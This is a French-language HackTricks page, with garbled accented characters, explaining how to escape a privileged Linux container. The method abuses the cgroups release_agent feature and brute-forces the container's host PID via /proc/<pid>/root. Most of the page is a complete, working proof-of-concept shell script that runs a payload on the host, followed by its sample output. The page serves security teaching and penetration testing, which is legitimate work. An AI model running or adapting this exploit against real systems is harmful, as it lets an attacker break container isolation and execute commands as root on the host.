<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Introduction

Les pr√©c√©dents PoCs fonctionnent bien lorsque le conteneur est configur√© avec un storage-driver qui expose **le chemin complet du point de montage sur l'h√¥te**, par exemple `overlayfs`, cependant il existe des configurations qui ne r√©v√®lent **pas clairement le point de montage du syst√®me de fichiers de l'h√¥te**.

Dans ce PoC, au lieu d'utiliser le chemin o√π le conteneur est situ√© dans le syst√®me de fichiers de l'h√¥te, nous allons d√©couvrir un PID de conteneur √† l'int√©rieur de l'h√¥te

## Exemples de conteneur ne r√©v√©lant pas l'emplacement du chemin √† l'int√©rieur de l'h√¥te

### Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) monte par d√©faut le syst√®me de fichiers racine d'un conteneur via `9pfs`. Cela ne r√©v√®le aucune information sur l'emplacement du syst√®me de fichiers du conteneur dans la machine virtuelle Kata Containers.

### Device Mapper
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
# PoC

La seule information cl√© n√©cessaire est le **chemin complet, relatif √† l'h√¥te du conteneur, d'un fichier √† ex√©cuter √† l'int√©rieur du conteneur**. Sans pouvoir d√©terminer cela √† partir des points de montage √† l'int√©rieur du conteneur, nous devons chercher ailleurs.

## /proc/\<pid>/root

Le pseudo-syst√®me de fichiers Linux `/proc` expose les structures de donn√©es de processus du noyau pour tous les processus en cours d'ex√©cution sur un syst√®me, y compris ceux qui s'ex√©cutent dans diff√©rents espaces de noms, par exemple √† l'int√©rieur d'un conteneur. Cela peut √™tre d√©montr√© en ex√©cutant une commande dans un conteneur et en acc√©dant au r√©pertoire `/proc` du processus sur l'h√¥te :Conteneur
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_En passant, la structure de donn√©es `/proc/<pid>/root` est une qui m'a longtemps confondu, je n'ai jamais compris pourquoi avoir un lien symbolique vers `/` √©tait utile, jusqu'√† ce que je lise la d√©finition r√©elle dans les pages de manuel :_

> /proc/\[pid]/root
>
> UNIX et Linux prennent en charge l'id√©e d'une racine du syst√®me de fichiers par processus, d√©finie par l'appel syst√®me chroot(2). Ce fichier est un lien symbolique qui pointe vers le r√©pertoire racine du processus et se comporte de la m√™me mani√®re que exe et fd/\*.
>
> Notez cependant que ce fichier n'est pas simplement un lien symbolique. Il fournit la m√™me vue du syst√®me de fichiers (y compris les espaces de noms et l'ensemble des montages par processus) que le processus lui-m√™me.

Le **lien symbolique `/proc/<pid>/root` peut √™tre utilis√© comme un chemin relatif √† l'h√¥te pour acc√©der √† n'importe quel fichier √† l'int√©rieur d'un conteneur** :
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
{% hint style="warning" %}
**Cela change la condition requise pour l'attaque de conna√Ætre le chemin complet, relatif √† l'h√¥te du conteneur, d'un fichier √† l'int√©rieur du conteneur, √† conna√Ætre le pid de **_**n'importe quel**_** processus s'ex√©cutant dans le conteneur.**
{% endhint %}

## Pid Bashing <a href="#pid-bashing" id="pid-bashing"></a>

C'est en fait la partie facile, les identifiants de processus dans Linux sont num√©riques et attribu√©s s√©quentiellement. Le processus `init` se voit attribuer l'identifiant de processus `1` et tous les processus suivants re√ßoivent des identifiants incr√©mentaux. Pour identifier **l'identifiant de processus h√¥te d'un processus √† l'int√©rieur d'un conteneur, une recherche incr√©mentale par force brute peut √™tre utilis√©e** :
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
H√¥te
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
## Mise en ≈ìuvre compl√®te <a href="#putting-it-all-together" id="putting-it-all-together"></a>

Pour mener √† bien cette attaque, la technique de force brute peut √™tre utilis√©e pour **deviner le PID pour le chemin `/proc/<pid>/root/payload.sh`**, avec **chaque it√©ration** √©crivant le chemin du pid devin√© **dans le fichier `release_agent` des cgroups, d√©clenchant le `release_agent`**, et v√©rifiant si un fichier de sortie est cr√©√©.

La seule mise en garde avec cette technique est qu'elle n'est en aucun cas subtile et peut augmenter consid√©rablement le nombre de pid. Comme aucun processus de longue dur√©e n'est maintenu actif, cela _ne devrait_ pas causer de probl√®mes de fiabilit√©, mais ne me citez pas l√†-dessus.

Le PoC ci-dessous met en ≈ìuvre ces techniques pour fournir une attaque plus g√©n√©rique que celle initialement pr√©sent√©e dans le PoC original de Felix pour s'√©chapper d'un conteneur privil√©gi√© en utilisant la fonctionnalit√© **`release_agent` des cgroups** :
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
L'ex√©cution du PoC dans un conteneur privil√©gi√© devrait fournir une sortie similaire √† :
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# R√©f√©rences

* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
